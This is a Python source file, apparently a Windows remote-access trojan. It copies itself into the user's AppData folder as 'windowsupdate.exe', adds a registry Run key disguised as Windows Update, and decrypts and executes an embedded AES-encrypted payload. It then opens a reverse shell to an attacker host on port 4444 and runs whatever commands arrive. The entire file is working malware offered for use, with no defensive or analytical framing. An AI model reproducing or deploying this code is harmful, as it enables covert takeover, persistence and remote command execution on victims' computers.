import os
import sys
import shutil
import socket
import subprocess
import base64
import hashlib
import tempfile
import winreg
from Crypto.Cipher import AES

PAYLOAD_ENCRYPTED = b"""rItw26/o/2TM4Mob+fPbOuTHXSCq9P..."""  # Substituído dinamicamente

def unpad(data):
    return data.rstrip(b' ')

def decrypt_payload(data, key_str):
    key = hashlib.sha256(key_str.encode()).digest()
    data = base64.b64decode(data)
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    return plaintext

def add_to_startup(file_path, name="WindowsUpdate"):
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(reg_key)

def move_to_stealth():
    target_path = os.path.join(os.environ["APPDATA"], "WindowsUpdate", "windowsupdate.exe")
    if os.path.abspath(sys.executable) != os.path.abspath(target_path):
        os.makedirs(os.path.dirname(target_path), exist_ok=True)
        shutil.copy2(sys.executable, target_path)
        subprocess.Popen([target_path], shell=True)
        sys.exit(0)
    return target_path

def shell_interativo(conn):
    conn.send(b"[+] Shell interativo iniciado...\n")
    while True:
        try:
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            conn.send(output if output else '[+] Comando executado sem saída.\n'.encode())
        except subprocess.CalledProcessError as e:
            conn.send(e.output)
        except Exception as e:
            conn.send(f"Erro: {str(e)}\n".encode())

def run():
    try:
        stealth_path = move_to_stealth()
        add_to_startup(file_path=stealth_path)
    except:
        pass

    try:
        key = "senhaforte123"
        payload = decrypt_payload(PAYLOAD_ENCRYPTED, key)
        exec(payload.decode(), {"__builtins__": __builtins__})
    except:
        pass

    host = "192.xxx.x.xx"
    port = 4444

    try:
        s = socket.socket()
        s.connect((host, port))

        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd == "shell":
                shell_interativo(s)
            elif cmd in ["exit", "quit"]:
                break
            else:
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(result)
                except subprocess.CalledProcessError as e:
                    s.send(e.output)
                except Exception as err:
                    s.send(str(err).encode())
        s.close()
    except:
        pass

    sys.exit(0)

if __name__ == "__main__":
    run()